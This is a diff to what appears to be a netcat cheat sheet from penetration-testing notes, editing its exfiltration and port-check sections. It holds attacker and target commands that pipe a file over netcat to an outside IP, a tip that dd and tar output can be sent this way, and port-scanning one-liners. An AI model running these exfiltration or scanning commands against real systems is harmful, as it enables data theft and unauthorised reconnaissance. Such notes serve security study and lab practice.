@@ -314,7 +314,7 @@ nc -lnvp 12345
 nc 10.10.14.69 12345
 ```
 
-> exfiltration
+> exfiltration by piping over the network
 ```sh
 # attacker:
 nc -lnvp 12345 > exfil_file
@@ -323,10 +323,15 @@ nc -lnvp 12345 > exfil_file
 nc -q0 10.10.14.69 12345 < exfil_file
 ```
 
+* commands this can be useful for: `dd`, `tar` (tar pipe)
+
 > check for open port
 ```sh
-nc -zv localhost 80
+nc -vvz localhost 443
+
+# multiple
+nc -vzz localhost 80 8080
 
 # or a range
-nc -zv localhost 1-1024 2>/dev/null
+nc -vvz localhost 1-1024 2>&1 | grep -v refused
 ```
